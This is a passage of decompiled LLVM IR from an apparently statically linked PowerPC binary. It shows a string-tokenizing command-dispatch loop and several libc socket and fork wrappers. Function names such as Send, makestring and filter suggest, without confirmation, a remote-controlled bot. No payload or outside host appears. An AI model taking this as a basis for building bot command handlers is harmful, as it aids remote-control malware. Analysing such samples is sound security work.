  store i32 %storemerge51.in, i32* @r3, align 4
  %v0_10002c4041 = call i32 @__GI_strlen()
  %v2_10002c4843 = icmp eq i32 %v0_10002c4041, 0
  br i1 %v2_10002c4843, label %dec_label_pc_10002c70, label %dec_label_pc_10002c50

dec_label_pc_10002c2c:                            ; preds = %dec_label_pc_10002c50
  %v1_10002c30 = add i32 %v3_10002c50, 1
  store i32 %v1_10002c30, i32* %stack_var_-6808, align 4
  store i32 %storemerge51.in, i32* @r3, align 4
  %v0_10002c40 = call i32 @__GI_strlen()
  %v2_10002c48 = icmp ult i32 %v1_10002c30, %v0_10002c40
  br i1 %v2_10002c48, label %dec_label_pc_10002c50, label %dec_label_pc_10002c70

dec_label_pc_10002c50:                            ; preds = %dec_label_pc_10002c38.preheader, %dec_label_pc_10002c2c
  %v3_10002c50 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002c5c = add i32 %v3_10002c50, %storemerge51.in
  %v1_10002c60 = inttoptr i32 %v2_10002c5c to i8*
  %v2_10002c60 = load i8, i8* %v1_10002c60, align 1
  %v3_10002c68 = icmp eq i8 %v2_10002c60, 32
  br i1 %v3_10002c68, label %dec_label_pc_10002c70, label %dec_label_pc_10002c2c

dec_label_pc_10002c70:                            ; preds = %dec_label_pc_10002c38.preheader, %dec_label_pc_10002c2c, %dec_label_pc_10002c50
  %v3_10002c70 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002c7c = add i32 %v3_10002c70, %storemerge51.in
  %v3_10002c84 = inttoptr i32 %v2_10002c7c to i8*
  store i8 0, i8* %v3_10002c84, align 1
  %v4_10002c94 = call i32 @strcpy(i32 %v2_10002c88, i8* %storemerge51)
  %v3_10002c98 = load i32, i32* %stack_var_-6808, align 4
  %v2_10002ca4 = add i32 %v3_10002c98, %storemerge51.in
  %v1_10002ca8 = add i32 %v2_10002ca4, 1
  %v3_10002cb4 = inttoptr i32 %v1_10002ca8 to i8*
  %v4_10002cb4 = call i32 @strcpy(i32 %storemerge51.in, i8* %v3_10002cb4)
  store i32 0, i32* %stack_var_-6808, align 4
  %v2_10002d54103 = load i32, i32* bitcast ([4 x i8]** @global_var_10027a34.106 to i32*), align 4
  %v3_10002d58106 = icmp eq i32 %v2_10002d54103, 0
  br i1 %v3_10002d58106, label %dec_label_pc_10002d60, label %dec_label_pc_10002cc4

dec_label_pc_10002cc4:                            ; preds = %dec_label_pc_10002c70, %dec_label_pc_10002cc4
  %v1_10002d54109 = phi i32* [ %v1_10002d54, %dec_label_pc_10002cc4 ], [ bitcast ([4 x i8]** @global_var_10027a34.106 to i32*), %dec_label_pc_10002c70 ]
  %v2_10002cd8 = load i32, i32* %v1_10002d54109, align 4
  store i32 %v2_10002cd8, i32* @r3, align 4
  store i32 %v2_10002c88, i32* @r4, align 4
  %v2_10002ce8 = call i32 @__GI_strcasecmp(i32 %v2_10002cd8, i32 %v2_10002c88)
  %v3_10002cf8 = load i32, i32* %stack_var_-6808, align 4
  %v1_10002d04 = mul i32 %v3_10002cf8, 8
  %v1_10002d0c = add i32 %v1_10002d04, add (i32 ptrtoint ([4 x i8]** @global_var_10027a34.106 to i32), i32 4)
  %v1_10002d10 = inttoptr i32 %v1_10002d0c to i32*
  %v2_10002d10 = load i32, i32* %v1_10002d10, align 4
  call void @__pseudo_call(i32 %v2_10002d10)
  %v3_10002d34 = load i32, i32* %stack_var_-6808, align 4
  %v1_10002d38 = add i32 %v3_10002d34, 1
  store i32 %v1_10002d38, i32* %stack_var_-6808, align 4
  %v1_10002d4c = mul i32 %v1_10002d38, 8
  %v2_10002d50 = add i32 %v1_10002d4c, ptrtoint ([4 x i8]** @global_var_10027a34.106 to i32)
  %v1_10002d54 = inttoptr i32 %v2_10002d50 to i32*
  %v2_10002d54 = load i32, i32* %v1_10002d54, align 4
  %v3_10002d58 = icmp eq i32 %v2_10002d54, 0
  br i1 %v3_10002d58, label %dec_label_pc_10002d60, label %dec_label_pc_10002cc4

dec_label_pc_10002d60:                            ; preds = %dec_label_pc_10002cc4, %dec_label_pc_10002c70
  store i32 %v2_10002c88, i32* @r3, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10015cc8.107 to i32), i32* @r4, align 4
  %v3_10002d70 = call i32 @__GI_strcasecmp(i32 %v2_10002c88, i32 ptrtoint ([6 x i8]* @global_var_10015cc8.107 to i32))
  %v3_10002d78 = icmp eq i32 %v3_10002d70, 0
  br i1 %v3_10002d78, label %dec_label_pc_100027bc, label %dec_label_pc_10002d80

dec_label_pc_10002d80:                            ; preds = %dec_label_pc_10002d60
  store i32 ptrtoint (i32* @global_var_10015cc4.102 to i32), i32* @r4, align 4
  store i32 268447120, i32* @lr, align 4
  %v3_10002d8c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10015cc4.102 to i32), i32 268500992)
  %v3_10002d9c = icmp eq i32 %v3_10002d8c, 0
  br i1 %v3_10002d9c, label %dec_label_pc_1000282c, label %dec_label_pc_10002da4

dec_label_pc_10002da4:                            ; preds = %dec_label_pc_10002b20, %dec_label_pc_10002d80
  %storemerge51.in = phi i32 [ %v3_10002d8c, %dec_label_pc_10002d80 ], [ %v3_10002b44, %dec_label_pc_10002b20 ]
  %storemerge51 = inttoptr i32 %storemerge51.in to i8*
  %v2_10002da8 = load i8, i8* %storemerge51, align 1
  %v3_10002db0 = icmp eq i8 %v2_10002da8, 0
  br i1 %v3_10002db0, label %dec_label_pc_1000282c, label %dec_label_pc_10002b54

; uselistorder directives
  uselistorder i8* %storemerge51, { 2, 1, 0 }
  uselistorder i32 %storemerge51.in, { 14, 13, 7, 10, 5, 4, 9, 3, 8, 6, 12, 2, 1, 0, 11 }
  uselistorder i32* %v1_10002d54, { 1, 0 }
  uselistorder i32 %v4_10002ad8, { 1, 0 }
  uselistorder i32 %v2_10002ac8, { 0, 2, 1 }
  uselistorder i32 %v3_10002ab0, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10002a54, { 1, 0 }
  uselistorder i32 %v1_10002a20, { 1, 0 }
  uselistorder i32 %storemerge2131, { 1, 0 }
  uselistorder i32 %v0_10002a04, { 1, 0 }
  uselistorder i32 %v1_10002950, { 0, 2, 1 }
  uselistorder i32 %v2_10002970100, { 1, 0 }
  uselistorder i32 %.pre, { 2, 4, 0, 3, 1 }
  uselistorder i32 %storemerge1435, { 1, 0 }
  uselistorder i32 %v3_10002874, { 1, 0 }
  uselistorder i32 %storemerge1327, { 1, 0 }
  uselistorder i32 %v2_10002c88, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_10002af4, { 1, 0, 2 }
  uselistorder i32 %v2_100028e0, { 1, 0 }
  uselistorder i32 %v2_1000282c, { 2, 1, 0 }
  uselistorder i32 %v2_10002724, { 1, 0 }
  uselistorder i32 %v1_100026d4, { 1, 0 }
  uselistorder i32 %v2_10002694, { 1, 0 }
  uselistorder i32 %storemerge1255, { 1, 0 }
  uselistorder i32 %v3_100025e4, { 1, 0, 2 }
  uselistorder i32 %v2_10002570, { 1, 0, 2 }
  uselistorder i32 %v2_10002548, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_10002510, { 1, 0 }
  uselistorder i32* %v1_100024bc, { 1, 0, 2 }
  uselistorder i32 %stack_var_-6760.0, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %stack_var_-6808, { 5, 6, 7, 0, 8, 9, 10, 4, 1, 11, 12, 13, 3, 2, 14, 15 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_10027a34.106 to i32), { 1, 0 }
  uselistorder [4 x i8]** @global_var_10027a34.106, { 1, 0 }
  uselistorder i32 (i32)* @filter, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10015cc4.102 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @recv, { 1, 0 }
  uselistorder i32* @global_var_1002c318.28, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* @global_var_1002c2ec.27, { 5, 6, 2, 7, 8, 9, 0, 1, 10, 3, 11, 4, 12, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @Send, { 17, 16, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i8** @global_var_1002c304.96, { 1, 0 }
  uselistorder i32* @global_var_10015c18.73, { 1, 0 }
  uselistorder i32 (i32, i32)* @makestring, { 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 7, 2, 0, 1, 6, 5, 4, 3 }
  uselistorder i8 47, { 1, 0 }
  uselistorder i8** %argv, { 1, 0, 2 }
  uselistorder i32 %argc, { 1, 0 }
  uselistorder label %dec_label_pc_10002da4, { 1, 0 }
  uselistorder label %dec_label_pc_10002cc4, { 1, 0 }
  uselistorder label %dec_label_pc_10002c70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002c50, { 1, 0 }
  uselistorder label %dec_label_pc_10002c38.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10002bc0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002ba0, { 1, 0 }
  uselistorder label %dec_label_pc_10002aac, { 1, 0 }
  uselistorder label %dec_label_pc_10002a8c, { 1, 0 }
  uselistorder label %dec_label_pc_10002a70, { 1, 0 }
  uselistorder label %dec_label_pc_10002a1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000295c, { 1, 0 }
  uselistorder label %dec_label_pc_10002914, { 1, 0 }
  uselistorder label %dec_label_pc_10002840, { 1, 0 }
  uselistorder label %dec_label_pc_1000282c, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_100027bc, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10002680, { 1, 0 }
  uselistorder label %dec_label_pc_10002644, { 1, 0 }
  uselistorder label %dec_label_pc_1000262c, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000250c, { 1, 0 }
  uselistorder label %dec_label_pc_100024ac, { 1, 0 }
}

define i32 @__h_errno_location(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10002dbc = load i32, i32* @r2, align 4
  %v1_10002dbc = add i32 %v0_10002dbc, 76
  %v2_10002dbc = inttoptr i32 %v1_10002dbc to i32*
  %v3_10002dbc = load i32, i32* %v2_10002dbc, align 4
  ret i32 %v3_10002dbc
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  %v0_10002dc4 = load i32, i32* @r2, align 4
  %v1_10002dc4 = add i32 %v0_10002dc4, 68
  %v2_10002dc4 = inttoptr i32 %v1_10002dc4 to i32*
  %v3_10002dc4 = load i32, i32* %v2_10002dc4, align 4
  ret i32 %v3_10002dc4
}

define i32 @pthread_insert_list(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10002dcc = icmp eq i32 %arg1, 0
  %v0_10002dd0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10002dcc, i32 %v0_10002dd0)
  %v3_10002dd4 = icmp eq i32 %arg3, 0
  br i1 %v3_10002dd4, label %dec_label_pc_10002df0, label %dec_label_pc_10002de4.preheader

dec_label_pc_10002de4.preheader:                  ; preds = %entry
  call void @llvm.trap()
  unreachable

dec_label_pc_10002df0:                            ; preds = %entry
  store i32 %arg1, i32* %arg2, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @pthread_call_handlers() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %storemerge1 = load i32, i32* @r3, align 4
  store i32 %storemerge1, i32* %r31.global-to-local, align 4
  %v3_10002e2c4 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10002e2c4, label %dec_label_pc_10002e34, label %dec_label_pc_10002e1c

dec_label_pc_10002e1c:                            ; preds = %entry, %dec_label_pc_10002e1c
  %v0_10002e1c = phi i32 [ %storemerge, %dec_label_pc_10002e1c ], [ %storemerge1, %entry ]
  %v1_10002e1c = inttoptr i32 %v0_10002e1c to i32*
  %v2_10002e1c = load i32, i32* %v1_10002e1c, align 4
  call void @__pseudo_call(i32 %v2_10002e1c)
  %v0_10002e28 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002e28 = add i32 %v0_10002e28, 4
  %v2_10002e28 = inttoptr i32 %v1_10002e28 to i32*
  %storemerge = load i32, i32* %v2_10002e28, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_10002e2c = icmp eq i32 %storemerge, 0
  br i1 %v3_10002e2c, label %dec_label_pc_10002e2c.dec_label_pc_10002e34_crit_edge, label %dec_label_pc_10002e1c

dec_label_pc_10002e2c.dec_label_pc_10002e34_crit_edge: ; preds = %dec_label_pc_10002e1c
  %v0_10002e44.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10002e34

dec_label_pc_10002e34:                            ; preds = %dec_label_pc_10002e2c.dec_label_pc_10002e34_crit_edge, %entry
  %v0_10002e44 = phi i32 [ %v0_10002e44.pre, %dec_label_pc_10002e2c.dec_label_pc_10002e34_crit_edge ], [ 0, %entry ]
  ret i32 %v0_10002e44

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10002e1c, { 1, 0 }
}

define i32 @fork() local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i32, align 4
  %v0_10002e54 = call i32 @__asm_mfcr()
  store i32 ptrtoint (i32* @global_var_1002c814.108 to i32), i32* @r27, align 4
  store i32 268447344, i32* @lr, align 4
  %v1_10002e6c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c814.108 to i32))
  %v3_10002e74 = load i32, i32* @global_var_1002c31c.109, align 4
  store i32 %v3_10002e74, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10002e8c.112 to i32), i32* @lr, align 4
  %v0_10002e88 = call i32 @pthread_call_handlers()
  store i32 268447376, i32* @lr, align 4
  %v1_10002e8c = call i32 @__pthread_once_fork_prepare(i32 %v0_10002e88)
  store i32 ptrtoint (i32* @global_var_10030c78.113 to i32), i32* @r28, align 4
  store i32 268447392, i32* @lr, align 4
  %v1_10002e9c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10030c78.113 to i32))
  store i32 ptrtoint (i32* @global_var_10030b4c.114 to i32), i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10002eb0.115 to i32), i32* @lr, align 4
  %v1_10002eac = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10030b4c.114 to i32))
  store i32 268447412, i32* @lr, align 4
  %v1_10002eb0 = call i32 @__libc_fork(i32 %v1_10002eac)
  store i32 %v1_10002eb0, i32* @r26, align 4
  %v3_10002eb8 = icmp eq i32 %v1_10002eb0, 0
  store i32 268461500, i32* @r9, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v0_10002ec4 = load i32, i32* @r30, align 4
  store i32 %v0_10002ec4, i32* @r3, align 4
  br i1 %v3_10002eb8, label %dec_label_pc_10002f00, label %dec_label_pc_10002f4c

dec_label_pc_10002f00:                            ; preds = %entry
  %v2_10002ecc = ptrtoint i32* %stack_var_-56 to i32
  %v2_10002edc = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-56)
  %v3_10002ee8 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-56, i32 0)
  %v0_10002eec = load i32, i32* @r30, align 4
  %v3_10002ef4 = call i32 @pthread_mutex_init(i32 %v0_10002eec, i32* nonnull %stack_var_-56)
  %v1_10002efc = call i32 @pthread_mutexattr_destroy(i32 %v2_10002ecc)
  %v0_10002f00 = load i32, i32* @r28, align 4
  %v3_10002f08 = call i32 @pthread_mutex_init(i32 %v0_10002f00, i32* null)
  %v0_10002f10 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10002f10, label %dec_label_pc_10002f38, label %dec_label_pc_10002f14

dec_label_pc_10002f14:                            ; preds = %dec_label_pc_10002f00
  %v2_10002f14 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-56)
  %v3_10002f20 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-56, i32 0)
  %v0_10002f24 = load i32, i32* @r27, align 4
  %v3_10002f2c = call i32 @pthread_mutex_init(i32 %v0_10002f24, i32* nonnull %stack_var_-56)
  %v1_10002f34 = call i32 @pthread_mutexattr_destroy(i32 %v2_10002ecc)
  br label %dec_label_pc_10002f38

dec_label_pc_10002f38:                            ; preds = %dec_label_pc_10002f00, %dec_label_pc_10002f14
  store i32 ptrtoint (i32* @global_var_10002f3c.117 to i32), i32* @lr, align 4
  %v0_10002f38 = call i32 @__pthread_reset_main_thread()
  store i32 ptrtoint (i32* @global_var_10002f40.118 to i32), i32* @lr, align 4
  %v1_10002f3c = call i32 @__fresetlockfiles(i32 %v0_10002f38)
  store i32 268447556, i32* @lr, align 4
  %v1_10002f40 = call i32 @__pthread_once_fork_child(i32 %v1_10002f3c)
  br label %dec_label_pc_10002f68

dec_label_pc_10002f4c:                            ; preds = %entry
  store i32 268447568, i32* @lr, align 4
  %v0_10002f4c = call i32 @pthread_mutex_unlock()
  %v0_10002f50 = load i32, i32* @r28, align 4
  store i32 %v0_10002f50, i32* @r3, align 4
  store i32 268447576, i32* @lr, align 4
  %v0_10002f54 = call i32 @pthread_mutex_unlock()
  %v0_10002f58 = load i32, i32* @r27, align 4
  store i32 %v0_10002f58, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10002f60.119 to i32), i32* @lr, align 4
  %v0_10002f5c = call i32 @pthread_mutex_unlock()
  store i32 268447588, i32* @lr, align 4
  %v1_10002f60 = call i32 @__pthread_once_fork_parent(i32 %v0_10002f5c)
  br label %dec_label_pc_10002f68

dec_label_pc_10002f68:                            ; preds = %dec_label_pc_10002f38, %dec_label_pc_10002f4c
  %storemerge.in = phi i32* [ @r31, %dec_label_pc_10002f4c ], [ @r25, %dec_label_pc_10002f38 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r3, align 4
  store i32 268447596, i32* @lr, align 4
  %v0_10002f68 = call i32 @pthread_call_handlers()
  %v0_10002f6c = load i32, i32* @r26, align 4
  %v1_10002f80 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10002e54)
  %v9_10002f80 = extractvalue %0 %v1_10002f80, 7
  store i4 %v9_10002f80, i4* @cr4, align 1
  ret i32 %v0_10002f6c

; uselistorder directives
  uselistorder i32 %v2_10002ecc, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 ()* @pthread_call_handlers, { 1, 0 }
  uselistorder label %dec_label_pc_10002f68, { 1, 0 }
  uselistorder label %dec_label_pc_10002f38, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v0_10002f8c = call i32 @fork()
  ret i32 %v0_10002f8c

; uselistorder directives
  uselistorder i32 ()* @fork, { 3, 2, 1, 0 }
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r30, align 4
  store i32 24, i32* @r3, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 268447668, i32* @lr, align 4
  %v0_10002fb0 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_10002fb8 = icmp eq i32 %v0_10002fb0, 0
  store i32 ptrtoint (i32* @global_var_1002c814.108 to i32), i32* %r27.global-to-local, align 4
  br i1 %v3_10002fb8, label %dec_label_pc_10003024, label %dec_label_pc_10002fcc

dec_label_pc_10002fcc:                            ; preds = %entry
  store i32 268447696, i32* @lr, align 4
  %v1_10002fcc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c814.108 to i32))
  %v0_10002fd8 = load i32, i32* @r30, align 4
  %v0_10002fdc = load i32, i32* @r31, align 4
  store i32 268447720, i32* @lr, align 4
  %v4_10002fe4 = inttoptr i32 %v0_10002fd8 to i32*
  %v5_10002fe4 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_1002c31c.109 to i32), i32* %v4_10002fe4, i32 %v0_10002fdc, i32 0)
  %v0_10002ff0 = load i32, i32* @r29, align 4
  %v0_10002ff4 = load i32, i32* @r31, align 4
  %v1_10002ff4 = add i32 %v0_10002ff4, 8
  store i32 268447744, i32* @lr, align 4
  %v4_10002ffc = inttoptr i32 %v0_10002ff0 to i32*
  %v5_10002ffc = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_1002c324.111 to i32), i32* %v4_10002ffc, i32 %v1_10002ff4, i32 1)
  %v0_10003004 = load i32, i32* @r28, align 4
  %v0_10003008 = load i32, i32* @r31, align 4
  %v1_10003008 = add i32 %v0_10003008, 16
  store i32 268447768, i32* @lr, align 4
  %v4_10003014 = inttoptr i32 %v0_10003004 to i32*
  %v5_10003014 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_1002c320.110 to i32), i32* %v4_10003014, i32 %v1_10003008, i32 1)
  %v0_10003018 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10003018, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10003020.120 to i32), i32* @lr, align 4
  %v0_1000301c = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_10003024

dec_label_pc_10003024:                            ; preds = %entry, %dec_label_pc_10002fcc
  %v0_10003024 = phi i32 [ 12, %entry ], [ 0, %dec_label_pc_10002fcc ]
  ret i32 %v0_10003024

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_1002c814.108 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10003024, { 1, 0 }
}

define i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r26.global-to-local, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  %v2_10003060 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268447856, i32* @lr, align 4
  %v3_1000306c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003060)
  %v0_10003070 = load i32, i32* %r28.global-to-local, align 4
  %v0_10003074 = load i32, i32* %r27.global-to-local, align 4
  %v0_10003078 = load i32, i32* %r26.global-to-local, align 4
  %v0_1000307c = load i32, i32* %r25.global-to-local, align 4
  %v0_10003080 = load i32, i32* %r24.global-to-local, align 4
  %v0_10003084 = load i32, i32* %r29.global-to-local, align 4
  store i32 268447884, i32* @lr, align 4
  %v6_10003088 = call i32 @__libc_sendto(i32 %v0_10003084, i32 %v0_10003070, i32 %v0_10003074, i32 %v0_10003078, i32 %v0_1000307c, i32 %v0_10003080)
  store i32 %v6_10003088, i32* %r29.global-to-local, align 4
  %v3_10003094 = load i32, i32* %stack_var_-56, align 4
  store i32 268447900, i32* @lr, align 4
  %v2_10003098 = trunc i32 %v3_10003094 to i8
  %v3_10003098 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003098, i32 0)
  ret i32 %v6_10003088
}

define i32 @sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100030cc = ptrtoint i32* %stack_var_-40 to i32
  store i32 268447964, i32* @lr, align 4
  %v3_100030d8 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100030cc)
  store i32 268447980, i32* @lr, align 4
  %v3_100030e8 = call i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_100030f4 = load i32, i32* %stack_var_-40, align 4
  store i32 268447996, i32* @lr, align 4
  %v2_100030f8 = trunc i32 %v3_100030f4 to i8
  %v3_100030f8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100030f8, i32 0)
  ret i32 %v3_100030e8
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10003130 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268448064, i32* @lr, align 4
  %v3_1000313c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003130)
  store i32 268448084, i32* @lr, align 4
  %v4_10003150 = call i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_1000315c = load i32, i32* %stack_var_-40, align 4
  store i32 268448100, i32* @lr, align 4
  %v2_10003160 = trunc i32 %v3_1000315c to i8
  %v3_10003160 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003160, i32 0)
  ret i32 %v4_10003150
}

define i32 @recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10003194 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268448164, i32* @lr, align 4
  %v3_100031a0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003194)
  store i32 268448180, i32* @lr, align 4
  %v3_100031b0 = call i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_100031bc = load i32, i32* %stack_var_-40, align 4
  store i32 268448196, i32* @lr, align 4
  %v2_100031c0 = trunc i32 %v3_100031bc to i8
  %v3_100031c0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100031c0, i32 0)
  ret i32 %v3_100031b0
}

define i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r26.global-to-local, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  %v2_10003200 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268448272, i32* @lr, align 4
  %v3_1000320c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003200)
  %v0_10003210 = load i32, i32* %r28.global-to-local, align 4
  %v0_10003214 = load i32, i32* %r27.global-to-local, align 4
  %v0_10003218 = load i32, i32* %r26.global-to-local, align 4
  %v0_1000321c = load i32, i32* %r25.global-to-local, align 4
  %v0_10003220 = load i32, i32* %r24.global-to-local, align 4
  %v0_10003224 = load i32, i32* %r29.global-to-local, align 4
  store i32 268448300, i32* @lr, align 4
  %v6_10003228 = call i32 @__libc_recvfrom(i32 %v0_10003224, i32 %v0_10003210, i32 %v0_10003214, i32 %v0_10003218, i32 %v0_1000321c, i32 %v0_10003220)
  store i32 %v6_10003228, i32* %r29.global-to-local, align 4
  %v3_10003234 = load i32, i32* %stack_var_-56, align 4
  store i32 268448316, i32* @lr, align 4
  %v2_10003238 = trunc i32 %v3_10003234 to i8
  %v3_10003238 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003238, i32 0)
  ret i32 %v6_10003228
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10003270 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268448384, i32* @lr, align 4
  %v3_1000327c = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_10003270)
  store i32 268448404, i32* @lr, align 4
  %v4_10003290 = call i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v3_1000329c = load i32, i32* %stack_var_-40, align 4
  store i32 268448420, i32* @lr, align 4
  %v2_100032a0 = trunc i32 %v3_1000329c to i8
  %v3_100032a0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_100032a0, i32 0)
  ret i32 %v4_10003290
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_100032d4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268448484, i32* @lr, align 4
  %v3_100032e0 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_100032d4)
  store i32 268448500, i32* @lr, align 4
  %v3_100032f0 = call i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3)
  %v3_100032fc = load i32, i32* %stack_var_-40, align 4
  store i32 268448516, i32* @lr, align 4
  %v2_10003300 = trunc i32 %v3_100032fc to i8
  %v3_10003300 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10003300, i32 0)
  ret i32 %v3_100032f0
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
